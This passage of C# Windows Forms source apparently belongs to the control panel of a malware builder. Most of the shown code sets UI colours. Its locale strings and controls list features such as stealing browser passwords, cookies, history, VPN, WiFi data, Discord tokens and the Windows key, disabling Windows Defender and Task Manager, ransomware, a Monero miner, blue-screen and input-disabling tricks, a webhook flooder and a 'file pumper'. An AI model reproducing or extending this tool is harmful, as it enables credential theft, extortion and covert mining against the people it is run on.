            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            logoBox.Image = Properties.Resources.d2;
            iconBox.Image = Properties.Resources.none3;

            button1.FlatAppearance.BorderSize = 0;
            button2.FlatAppearance.BorderSize = 1;
            button3.FlatAppearance.BorderSize = 0;
            redButton.FlatAppearance.BorderSize = 0;

            if (translateLabel.Text != "null")
            {
                translateLabel.ForeColor = Color.DodgerBlue;
            }
            if (checkingLabel.Text != "null")
            {
                checkingLabel.ForeColor = Color.DodgerBlue;
            }

            navLabel.ForeColor = Color.DodgerBlue;
            usernameLabel.ForeColor = Color.DodgerBlue;
            versionLabel.ForeColor = Color.DodgerBlue;
            pnlNav.BackColor = Color.DodgerBlue;
            btnDashboard.ForeColor = Color.DodgerBlue;
            btnInventory.ForeColor = Color.DodgerBlue;
            btnWork.ForeColor = Color.DodgerBlue;
            btnMap.ForeColor = Color.DodgerBlue;
            btnParty.ForeColor = Color.DodgerBlue;
            btnSettings.ForeColor = Color.DodgerBlue;
            btnExit.ForeColor = Color.DodgerBlue;
            label1.ForeColor = Color.DodgerBlue;
            label2.ForeColor = Color.DodgerBlue;
            label3.ForeColor = Color.DodgerBlue;
            label4.ForeColor = Color.DodgerBlue;
            label5.ForeColor = Color.DodgerBlue;
            label6.ForeColor = Color.DodgerBlue;
            label7.ForeColor = Color.DodgerBlue;
            shYes.ForeColor = Color.DodgerBlue;
            shNo.ForeColor = Color.DodgerBlue;
            btnUpdates.ForeColor = Color.DodgerBlue;
            webhookBox.ForeColor = Color.DodgerBlue;
            englishButton.ForeColor = Color.DodgerBlue;
            russianButton.ForeColor = Color.DodgerBlue;
            frenchButton.ForeColor = Color.DodgerBlue;
            polishButton.ForeColor = Color.DodgerBlue;
            turkishButton.ForeColor = Color.DodgerBlue;
            spanishButton.ForeColor = Color.DodgerBlue;
            label57.ForeColor = Color.DodgerBlue;
            label54.ForeColor = Color.DodgerBlue;
            label53.ForeColor = Color.DodgerBlue;
            label37.ForeColor = Color.DodgerBlue;
            label52.ForeColor = Color.DodgerBlue;
            textBox6.ForeColor = Color.DodgerBlue;
            textBox1.ForeColor = Color.DodgerBlue;
            textBox3.ForeColor = Color.DodgerBlue;
            checkBox2.ForeColor = Color.DodgerBlue;
            checkBox3.ForeColor = Color.DodgerBlue;
            checkBox4.ForeColor = Color.DodgerBlue;
            label17.ForeColor = Color.DodgerBlue;
            label18.ForeColor = Color.DodgerBlue;
            label19.ForeColor = Color.DodgerBlue;
            label20.ForeColor = Color.DodgerBlue;
            label21.ForeColor = Color.DodgerBlue;
            faketitleBox.ForeColor = Color.DodgerBlue;
            fakeMessageBox.ForeColor = Color.DodgerBlue;
            obfuscateBox.ForeColor = Color.DodgerBlue;
            errorBox.ForeColor = Color.DodgerBlue;
            startupBox.ForeColor = Color.DodgerBlue;
            defenderBox.ForeColor = Color.DodgerBlue;
            taskmanagerBox.ForeColor = Color.DodgerBlue;
            bsodBox.ForeColor = Color.DodgerBlue;
            pluginBox.ForeColor = Color.DodgerBlue;
            blockerBox.ForeColor = Color.DodgerBlue;
            hidesBox.ForeColor = Color.DodgerBlue;
            jumpscareBox.ForeColor = Color.DodgerBlue;
            inputdBox.ForeColor = Color.DodgerBlue;
            swinkeyBox.ForeColor = Color.DodgerBlue;
            sbrpassBox.ForeColor = Color.DodgerBlue;
            sbrCookiesBox.ForeColor = Color.DodgerBlue;
            sVpnBox.ForeColor = Color.DodgerBlue;
            swifiBox.ForeColor = Color.DodgerBlue;
            sbrhisBox.ForeColor = Color.DodgerBlue;
            dinternetBox.ForeColor = Color.DodgerBlue;
            cryptoBox.ForeColor = Color.DodgerBlue;
            pluginSource.Lexer = Lexer.Cpp;
            pluginSource.StyleResetDefault();
            pluginSource.Styles[Style.Default].Font = "Consolas";
            pluginSource.Styles[Style.Default].Size = 10;
            pluginSource.Styles[Style.Default].BackColor = Color.FromArgb(5, 5, 5);
            pluginSource.Styles[Style.Default].ForeColor = Color.DodgerBlue;
            pluginSource.StyleClearAll();
            pluginSource.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DodgerBlue;
            pluginSource.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            pluginSource.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            pluginSource.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            pluginSource.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            pluginSource.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            pluginSource.Margins[0].Width = 16;
            pluginSource.Styles[Style.LineNumber].BackColor = Color.FromArgb(16, 16, 16);
            pluginSource.ScrollWidth = 1;
            label9.ForeColor = Color.DodgerBlue;
            label8.ForeColor = Color.DodgerBlue;
            fileinfoLabel.ForeColor = Color.DodgerBlue;
            buildingLabel.ForeColor = Color.DodgerBlue;
            embedBox.BackColor = Color.DodgerBlue;
            webhookCheck.ForeColor = Color.DodgerBlue;
            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            iconUpload.ForeColor = Color.DodgerBlue;
            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            colorSelect.ForeColor = Color.DodgerBlue;
            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            generateButton.ForeColor = Color.DodgerBlue;
            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            cloneButton.ForeColor = Color.DodgerBlue;
            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            buildButton.ForeColor = Color.DodgerBlue;
            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            label14.ForeColor = Color.DodgerBlue;
            label10.ForeColor = Color.DodgerBlue;
            label11.ForeColor = Color.DodgerBlue;
            label12.ForeColor = Color.DodgerBlue;
            label13.ForeColor = Color.DodgerBlue;
            label15.ForeColor = Color.DodgerBlue;
            label16.ForeColor = Color.DodgerBlue;
            dAIObox.ForeColor = Color.DodgerBlue;
            nameBox.ForeColor = Color.DodgerBlue;
            ipBox.ForeColor = Color.DodgerBlue;
            macBox.ForeColor = Color.DodgerBlue;
            tokenBox.ForeColor = Color.DodgerBlue;
            winBox.ForeColor = Color.DodgerBlue;
            exportCredentials.ForeColor = Color.DodgerBlue;
            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            dAIOupload.ForeColor = Color.DodgerBlue;
            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            label28.ForeColor = Color.DodgerBlue;
            pumpBox.ForeColor = Color.DodgerBlue;
            pumpPathBox.ForeColor = Color.DodgerBlue;
            label22.ForeColor = Color.DodgerBlue;
            label29.ForeColor = Color.DodgerBlue;
            miscWebhookBox.ForeColor = Color.DodgerBlue;
            TokenCheckerBox.ForeColor = Color.DodgerBlue;
            label23.ForeColor = Color.DodgerBlue;
            label24.ForeColor = Color.DodgerBlue;
            userBox.ForeColor = Color.DodgerBlue;
            textBox2.ForeColor = Color.DodgerBlue;
            label27.ForeColor = Color.DodgerBlue;
            flooderEmbed.BackColor = Color.DodgerBlue;
            safeBox.ForeColor = Color.DodgerBlue;
            label26.ForeColor = Color.DodgerBlue;
            label25.ForeColor = Color.DodgerBlue;
            label36.ForeColor = Color.DodgerBlue;
            label30.ForeColor = Color.DodgerBlue;
            label31.ForeColor = Color.DodgerBlue;
            label32.ForeColor = Color.DodgerBlue;
            label33.ForeColor = Color.DodgerBlue;
            label34.ForeColor = Color.DodgerBlue;
            label35.ForeColor = Color.DodgerBlue;
            tNameLabel.ForeColor = Color.DodgerBlue;
            tEmailLabel.ForeColor = Color.DodgerBlue;
            tPhoneLabel.ForeColor = Color.DodgerBlue;
            tIDLabel.ForeColor = Color.DodgerBlue;
            tMFALabel.ForeColor = Color.DodgerBlue;
            tVLabel.ForeColor = Color.DodgerBlue;
            kbBox.ForeColor = Color.DodgerBlue;
            mbBox.ForeColor = Color.DodgerBlue;
            gbBox.ForeColor = Color.DodgerBlue;
            pumpButton.ForeColor = Color.DodgerBlue;
            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            button4.ForeColor = Color.DodgerBlue;
            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            tokenChecker.ForeColor = Color.DodgerBlue;
            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            flooderEmSelect.ForeColor = Color.DodgerBlue;
            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            button6.ForeColor = Color.DodgerBlue;
            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            button5.ForeColor = Color.DodgerBlue;
            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            wdeleteButton.ForeColor = Color.DodgerBlue;
            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
            button8.ForeColor = Color.DodgerBlue;
            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            logoBox.Image = Properties.Resources.d4;
            iconBox.Image = Properties.Resources.none4;

            button1.FlatAppearance.BorderSize = 0;
            button2.FlatAppearance.BorderSize = 0;
            redButton.FlatAppearance.BorderSize = 0;
            button3.FlatAppearance.BorderSize = 1;

            if (translateLabel.Text != "null") 
            {
                translateLabel.ForeColor = Color.Gainsboro;
            }
            if (checkingLabel.Text != "null")
            {
                checkingLabel.ForeColor = Color.Gainsboro;
            }

            navLabel.ForeColor = Color.Gainsboro;
            usernameLabel.ForeColor = Color.Gainsboro;
            versionLabel.ForeColor = Color.Gainsboro;
            pnlNav.BackColor = Color.Gainsboro;
            btnDashboard.ForeColor = Color.Gainsboro;
            btnInventory.ForeColor = Color.Gainsboro;
            btnWork.ForeColor = Color.Gainsboro;
            btnMap.ForeColor = Color.Gainsboro;
            btnParty.ForeColor = Color.Gainsboro;
            btnSettings.ForeColor = Color.Gainsboro;
            btnExit.ForeColor = Color.Gainsboro;
            label1.ForeColor = Color.Gainsboro;
            label2.ForeColor = Color.Gainsboro;
            label3.ForeColor = Color.Gainsboro;
            label4.ForeColor = Color.Gainsboro;
            label5.ForeColor = Color.Gainsboro;
            label6.ForeColor = Color.Gainsboro;
            label7.ForeColor = Color.Gainsboro;
            shYes.ForeColor = Color.Gainsboro;
            shNo.ForeColor = Color.Gainsboro;
            btnUpdates.ForeColor = Color.Gainsboro;
            webhookBox.ForeColor = Color.Gainsboro;
            englishButton.ForeColor = Color.Gainsboro;
            russianButton.ForeColor = Color.Gainsboro;
            frenchButton.ForeColor = Color.Gainsboro;
            polishButton.ForeColor = Color.Gainsboro;
            turkishButton.ForeColor = Color.Gainsboro;
            spanishButton.ForeColor = Color.Gainsboro;
            label57.ForeColor = Color.Gainsboro;
            label54.ForeColor = Color.Gainsboro;
            label53.ForeColor = Color.Gainsboro;
            label37.ForeColor = Color.Gainsboro;
            label52.ForeColor = Color.Gainsboro;
            textBox6.ForeColor = Color.Gainsboro;
            textBox1.ForeColor = Color.Gainsboro;
            textBox3.ForeColor = Color.Gainsboro;
            checkBox2.ForeColor = Color.Gainsboro;
            checkBox3.ForeColor = Color.Gainsboro;
            checkBox4.ForeColor = Color.Gainsboro;
            label17.ForeColor = Color.Gainsboro;
            label18.ForeColor = Color.Gainsboro;
            label19.ForeColor = Color.Gainsboro;
            label20.ForeColor = Color.Gainsboro;
            label21.ForeColor = Color.Gainsboro;
            faketitleBox.ForeColor = Color.Gainsboro;
            fakeMessageBox.ForeColor = Color.Gainsboro;
            obfuscateBox.ForeColor = Color.Gainsboro;
            errorBox.ForeColor = Color.Gainsboro;
            startupBox.ForeColor = Color.Gainsboro;
            defenderBox.ForeColor = Color.Gainsboro;
            taskmanagerBox.ForeColor = Color.Gainsboro;
            bsodBox.ForeColor = Color.Gainsboro;
            pluginBox.ForeColor = Color.Gainsboro;
            blockerBox.ForeColor = Color.Gainsboro;
            hidesBox.ForeColor = Color.Gainsboro;
            jumpscareBox.ForeColor = Color.Gainsboro;
            inputdBox.ForeColor = Color.Gainsboro;
            swinkeyBox.ForeColor = Color.Gainsboro;
            sbrpassBox.ForeColor = Color.Gainsboro;
            sbrCookiesBox.ForeColor = Color.Gainsboro;
            sVpnBox.ForeColor = Color.Gainsboro;
            swifiBox.ForeColor = Color.Gainsboro;
            sbrhisBox.ForeColor = Color.Gainsboro;
            dinternetBox.ForeColor = Color.Gainsboro;
            cryptoBox.ForeColor = Color.Gainsboro;
            pluginSource.Lexer = Lexer.Cpp;
            pluginSource.StyleResetDefault();
            pluginSource.Styles[Style.Default].Font = "Consolas";
            pluginSource.Styles[Style.Default].Size = 10;
            pluginSource.Styles[Style.Default].BackColor = Color.FromArgb(5, 5, 5);
            pluginSource.Styles[Style.Default].ForeColor = Color.Gainsboro;
            pluginSource.StyleClearAll();
            pluginSource.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.Gainsboro;
            pluginSource.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            pluginSource.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            pluginSource.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            pluginSource.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            pluginSource.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            pluginSource.Margins[0].Width = 16;
            pluginSource.Styles[Style.LineNumber].BackColor = Color.FromArgb(16, 16, 16);
            pluginSource.ScrollWidth = 1;
            label9.ForeColor = Color.Gainsboro;
            label8.ForeColor = Color.Gainsboro;
            fileinfoLabel.ForeColor = Color.Gainsboro;
            buildingLabel.ForeColor = Color.Gainsboro;
            embedBox.BackColor = Color.Gainsboro;
            webhookCheck.ForeColor = Color.Gainsboro;
            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            iconUpload.ForeColor = Color.Gainsboro;
            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            colorSelect.ForeColor = Color.Gainsboro;
            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            generateButton.ForeColor = Color.Gainsboro;
            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            cloneButton.ForeColor = Color.Gainsboro;
            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            buildButton.ForeColor = Color.Gainsboro;
            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            label14.ForeColor = Color.Gainsboro;
            label10.ForeColor = Color.Gainsboro;
            label11.ForeColor = Color.Gainsboro;
            label12.ForeColor = Color.Gainsboro;
            label13.ForeColor = Color.Gainsboro;
            label15.ForeColor = Color.Gainsboro;
            label16.ForeColor = Color.Gainsboro;
            dAIObox.ForeColor = Color.Gainsboro;
            nameBox.ForeColor = Color.Gainsboro;
            ipBox.ForeColor = Color.Gainsboro;
            macBox.ForeColor = Color.Gainsboro;
            tokenBox.ForeColor = Color.Gainsboro;
            winBox.ForeColor = Color.Gainsboro;
            exportCredentials.ForeColor = Color.Gainsboro;
            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            dAIOupload.ForeColor = Color.Gainsboro;
            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            label28.ForeColor = Color.Gainsboro;
            pumpBox.ForeColor = Color.Gainsboro;
            pumpPathBox.ForeColor = Color.Gainsboro;
            label22.ForeColor = Color.Gainsboro;
            label29.ForeColor = Color.Gainsboro;
            miscWebhookBox.ForeColor = Color.Gainsboro;
            TokenCheckerBox.ForeColor = Color.Gainsboro;
            label23.ForeColor = Color.Gainsboro;
            label24.ForeColor = Color.Gainsboro;
            userBox.ForeColor = Color.Gainsboro;
            textBox2.ForeColor = Color.Gainsboro;
            label27.ForeColor = Color.Gainsboro;
            flooderEmbed.BackColor = Color.Gainsboro;
            safeBox.ForeColor = Color.Gainsboro;
            label26.ForeColor = Color.Gainsboro;
            label25.ForeColor = Color.Gainsboro;
            label36.ForeColor = Color.Gainsboro;
            label30.ForeColor = Color.Gainsboro;
            label31.ForeColor = Color.Gainsboro;
            label32.ForeColor = Color.Gainsboro;
            label33.ForeColor = Color.Gainsboro;
            label34.ForeColor = Color.Gainsboro;
            label35.ForeColor = Color.Gainsboro;
            tNameLabel.ForeColor = Color.Gainsboro;
            tEmailLabel.ForeColor = Color.Gainsboro;
            tPhoneLabel.ForeColor = Color.Gainsboro;
            tIDLabel.ForeColor = Color.Gainsboro;
            tMFALabel.ForeColor = Color.Gainsboro;
            tVLabel.ForeColor = Color.Gainsboro;
            kbBox.ForeColor = Color.Gainsboro;
            mbBox.ForeColor = Color.Gainsboro;
            gbBox.ForeColor = Color.Gainsboro;
            pumpButton.ForeColor = Color.Gainsboro;
            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            button4.ForeColor = Color.Gainsboro;
            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            tokenChecker.ForeColor = Color.Gainsboro;
            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            flooderEmSelect.ForeColor = Color.Gainsboro;
            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            button6.ForeColor = Color.Gainsboro;
            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            button5.ForeColor = Color.Gainsboro;
            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            wdeleteButton.ForeColor = Color.Gainsboro;
            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
            button8.ForeColor = Color.Gainsboro;
            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
        }

        private void shYes_Click(object sender, EventArgs e)
        {
            shNo.FlatAppearance.BorderSize = 0;
            shYes.FlatAppearance.BorderSize = 1;
            usernameLabel.Show();
        }

        private void shNo_Click(object sender, EventArgs e)
        {
            shNo.FlatAppearance.BorderSize = 1;
            shYes.FlatAppearance.BorderSize = 0;
            usernameLabel.Hide();
        }

        private void PopupMessage(string message)
        {
            notify nfForm = new notify(message);
            nfForm.Show();
        }

        private void webhookCheck_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(webhookBox.Text) || String.IsNullOrWhiteSpace(webhookBox.Text))
            {
                PopupMessage(whcbe);
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(webhookBox.Text);
                    PopupMessage(whvalid);
                }
                catch
                {
                    PopupMessage(whinvalid);
                }
            }
        }

        private void iconUpload_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog icOpen = new OpenFileDialog();
                icOpen.Title = "Select icon";
                icOpen.Filter = "Icon (*.ico)|*.ico";

                if (icOpen.ShowDialog() == DialogResult.OK)
                {
                    iconBox.Image = new Bitmap(icOpen.FileName);
                    label38.Text = icOpen.FileName;
                }
            }
            catch
            {
                PopupMessage(sthww);
            }
        }


        // LOCALES
        string whcbe = "Webhook cannot be empty!";
        string whvalid = "Webhook valid.";
        string whinvalid = "Invalid webhook.";
        string sthww = "Something went wrong.";
        string yes = "Yes";
        string no = "No";
        string check = "Check";
        string red = "Red";
        string green = "Green";
        string blue = "Blue";
        string white = "White";
        string lversion = "Version:";
        string uicolor = "UI Color:";
        string susername = "Show username:";
        string cupdates = "Check-updates:";
        string language = "Language:";
        string settings = "Settings";
        string lmain = "Main";
        string additional = "Additional";
        string inspector = "Inspector";
        string misc = "Misc";
        string upload = "Upload";
        string licon = "Icon";
        string build = "Build";
        string clone = "Clone";
        string generate = "Generate";
        string fInfo = "Metadata:";
        string none = "None";
        string generateorclone = "You need to generate or clone metadata.";
        string pumpinfo = "You need to provide size of the output file!";
        string selectpumpsize = "You need to select the size of pump.";
        string pumpedTo = "File pumped to ";
        string whdeleted = "Webhook deleted.";
        string whfstop = "Webhook flooder stopped.";
        string whusmsempty = "Webhook, name and message cannot be empty!";
        string toomany = "Too many requests.\nSpam delayed.";
        string start = "Start";
        string stop = "Stop";
        string started = "Started";
        string stopped = "Stopped";
        string cpuusage = "Select CPU usage.";
        string poolusrname = "Provide pool, username and password.";
        string compdone = "Compilation done.";
        string addcreated = "Additional options created. Compiling...";
        string savedas = "Saved as ";
        string creatingadds = "Creating additional options...";
        string creatingfile = "Creating file...";
        string openingexp = "Opening explorer...";
        string tokencannotempt = "Token cannot be empty!";
        string invalidtoken = "Invalid token.";
        string tokendeleted = "Token deleted.";
        string disabled = "Disabled";
        string enabled = "Enabled";
        string unverified = "Unverified";
        string verified = "Verified";
        string nopass = "No passwords!";
        string nocookies = "No cookies!";
        string nohistory = "No history!";
        string novpn = "No VPN!";
        string nowifinetwork = "No WiFi Network data!";
        string nowifipass = "No WiFi passwords";
        string filecreated = "File created. Please wait...";
        string lminer = "Miner";
        string exportas = "Export (as .txt)";
        string credentials = "Credentials";
        string dName = "Name:";
        string dIP = "IP Address:";
        string dMAC = "MAC Address:";
        string dToken = "DC Token:";
        string dWin = "WIN Key:";
        string embedcolor = "Embed color";
        string select = "Select";
        string idle = "Idle...";
        string delete = "Delete";
        string pump = "Pump";
        string filepumper = "File pumper";
        string lusername = "Username";
        string lmessage = "Message";
        string floodercolor = "Flooder embed color";
        string whflooder = "Webhook flooder";
        string deletewh = "Delete webhook";
        string deletetkn = "Delete token";
        string safemode = "Safe mode";
        string addsettings = "Additional settings";
        string fakeerror = "Fake error";
        string ltitle = "Title";
        string customplugin = "Custom plugin";
        string lobfuscate = "Obfuscate";
        string rostart = "Run on startup";
        string disabledefender = "Disable Windows Defender";
        string disablemanager = "Disable Task Manager";
        string lbsod = "Blue Screen";
        string wbblocker = "Website blocker";
        string lhide = "Hide stealer";
        string ljumpscare = "Jumpscare";
        string disableinput = "Disable mouse and keyboard";
        string swindowskey = "Steal windows key";
        string spasswords = "Steal browser passwords";
        string scookies = "Steal browser cookies";
        string svpnc = "Steal VPN";
        string wifidata = "Steal WiFi data";
        string disableinternet = "Disable internet";
        string shistory = "Steal browser history";
        string cminer = "Crypto miner";
        string lransomware = "Ransomware";
        string mpool = "Monero pool";
        string lpassword = "Password";
        string lusage = "CPU usage";
        string minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";




        private void refreshLanguage()
        {
            redButton.Text = red;
            button1.Text = green;
            button2.Text = blue;
            button3.Text = white;
            label1.Text = lversion;
            label2.Text = uicolor;
            label3.Text = susername;
            label5.Text = cupdates;
            label7.Text = language;
            btnSettings.Text = settings;
            btnDashboard.Text = lmain;
            btnInventory.Text = additional;
            btnWork.Text = inspector;
            btnMap.Text = misc;
            btnParty.Text = lminer;
            shYes.Text = yes;
            shNo.Text = no;
            btnUpdates.Text = check;
            webhookCheck.Text = check;
            iconUpload.Text = upload;
            label6.Text = licon;
            buildButton.Text = build;
            cloneButton.Text = clone;
            generateButton.Text = generate;
            label8.Text = fInfo;
            fileinfoLabel.Text = none;
            dAIOupload.Text = upload;
            label16.Text = exportas;
            exportCredentials.Text = credentials;
            label10.Text = dName;
            label11.Text = dIP;
            label12.Text = dMAC;
            label13.Text = dToken;
            label15.Text = dWin;
            label9.Text = embedcolor;
            colorSelect.Text = select;
            buildingLabel.Text = idle;
            button4.Text = check;
            tokenChecker.Text = check;
            flooderEmSelect.Text = select;
            button5.Text = start;
            button6.Text = stopped;
            wdeleteButton.Text = delete;
            button8.Text = delete;
            pumpButton.Text = pump;
            label28.Text = filepumper;
            label23.Text = lusername;
            label24.Text = lmessage;
            label27.Text = floodercolor;
            label26.Text = whflooder;
            label25.Text = deletewh;
            label36.Text = deletetkn;
            safeBox.Text = safemode;
            tNameLabel.Text = none;
            tEmailLabel.Text = none;
            tPhoneLabel.Text = none;
            tIDLabel.Text = none;
            tMFALabel.Text = none;
            tVLabel.Text = none;
            label21.Text = lmessage;
            label17.Text = addsettings;
            label18.Text = fakeerror;
            label20.Text = ltitle;
            label19.Text = customplugin;
            errorBox.Text = fakeerror;
            pluginBox.Text = customplugin;
            obfuscateBox.Text = lobfuscate;
            startupBox.Text = rostart;
            defenderBox.Text = disabledefender;
            taskmanagerBox.Text = disablemanager;
            bsodBox.Text = lbsod;
            blockerBox.Text = wbblocker;
            hidesBox.Text = lhide;
            jumpscareBox.Text = ljumpscare;
            inputdBox.Text = disableinput;
            sbrpassBox.Text = spasswords;
            swinkeyBox.Text = swindowskey;
            sbrCookiesBox.Text = scookies;
            sVpnBox.Text = svpnc;
            swifiBox.Text = wifidata;
            dinternetBox.Text = disableinternet;
            sbrhisBox.Text = shistory;
            cryptoBox.Text = cminer;
            ransomBox.Text = lransomware;
            label54.Text = lusername;
            label57.Text = mpool;
            label53.Text = lpassword;
            label37.Text = lusage;
            label52.Text = minerInstruction;
        }


        private void englishButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 1;
            russianButton.FlatAppearance.BorderSize = 0;
            frenchButton.FlatAppearance.BorderSize = 0;
